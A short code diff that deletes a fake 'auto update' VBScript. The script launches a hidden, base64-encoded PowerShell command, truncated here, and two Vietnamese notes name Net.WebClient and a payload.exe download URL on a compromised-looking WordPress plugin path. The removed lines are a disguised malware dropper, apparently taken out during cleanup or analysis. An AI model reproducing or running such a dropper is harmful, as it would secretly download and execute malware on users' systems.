@@ -1,5 +1,0 @@
-MZ - Script Auto Update (Fake)
-Set WshShell = CreateObject("WScript.Shell")
-WshShell.Run "powershell -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgAWwBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAiAEgA..."
-Giao thức mạng sử dụng: Net.WebClient
-Nguồn tải về: http://www.example-hacked-site.com/wp-content/plugins/mail/payload.exe
